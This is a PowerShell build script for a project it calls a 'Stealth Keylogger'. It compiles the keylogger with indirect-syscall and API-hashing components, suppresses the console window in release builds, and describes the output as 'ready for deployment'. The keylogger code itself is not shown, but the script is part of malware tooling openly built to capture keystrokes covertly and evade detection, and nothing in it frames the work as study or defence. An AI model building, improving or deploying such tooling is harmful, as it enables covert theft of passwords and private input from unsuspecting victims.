# Build script for Stealth Keylogger
# Copyright (c) 2025 - 28zaakypro@proton.me

param(
    [ValidateSet("Release", "Debug")]
    [string]$Mode = "Release"
)

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Stealth Keylogger - Build Script" -ForegroundColor Cyan
Write-Host "  Mode: $Mode" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

$compiler = "g++"
$sources = "main.cpp"
$output = if ($Mode -eq "Release") { "keylogger.exe" } else { "keylogger_debug.exe" }

# Compiler flags
$cxxFlags = @(
    "-std=c++17",
    "-Wall",
    "-Wextra",
    "-O2",
    "-static"
)

if ($Mode -eq "Release") {
    $cxxFlags += "-mwindows"  # No console window
    Write-Host "[*] Building release version (no console)" -ForegroundColor Yellow
} else {
    Write-Host "[*] Building debug version (with console)" -ForegroundColor Yellow
}

# Check if compiler exists
$compilerPath = Get-Command $compiler -ErrorAction SilentlyContinue
if (-not $compilerPath) {
    Write-Host "[ERROR] Compiler not found: $compiler" -ForegroundColor Red
    Write-Host "[INFO] Please install MinGW-w64 or MSYS2" -ForegroundColor Yellow
    exit 1
}

# Build command
$buildCmd = "$compiler $($cxxFlags -join ' ') -o $output $sources"
Write-Host "[*] Executing: $buildCmd" -ForegroundColor Gray

# First assemble the DoSyscall stub
Write-Host "[*] Assembling dosyscall.S..." -ForegroundColor Yellow
$asmOutput = & gcc -c dosyscall.S -o dosyscall.o 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "`n[ERROR] Assembly failed" -ForegroundColor Red
    Write-Host $asmOutput
    exit 1
}

# Compile
$startTime = Get-Date
& $compiler @cxxFlags -o $output main.cpp IndirectSyscalls.cpp APIHashing.cpp dosyscall.o 2>&1

if ($LASTEXITCODE -eq 0) {
    $endTime = Get-Date
    $duration = ($endTime - $startTime).TotalSeconds
    
    $fileInfo = Get-Item $output
    $sizeKB = [math]::Round($fileInfo.Length / 1KB, 2)
    $sizeMB = [math]::Round($fileInfo.Length / 1MB, 2)
    
    Write-Host "`n[SUCCESS] Build completed in $([math]::Round($duration, 2))s" -ForegroundColor Green
    Write-Host "[+] Output: $output" -ForegroundColor Green
    Write-Host "[+] Size: $sizeKB KB ($sizeMB MB)" -ForegroundColor Green
    
    if ($Mode -eq "Release") {
        Write-Host "`n[INFO] Release build features:" -ForegroundColor Cyan
        Write-Host "  - No console window" -ForegroundColor Gray
        Write-Host "  - Optimized (-O2)" -ForegroundColor Gray
        Write-Host "  - Static linking" -ForegroundColor Gray
        Write-Host "  - Ready for deployment" -ForegroundColor Gray
    }
    
    Write-Host "`n[INFO] Usage:" -ForegroundColor Cyan
    Write-Host "  .\$output" -ForegroundColor Gray
    
} else {
    Write-Host "`n[ERROR] Build failed" -ForegroundColor Red
    exit 1
}
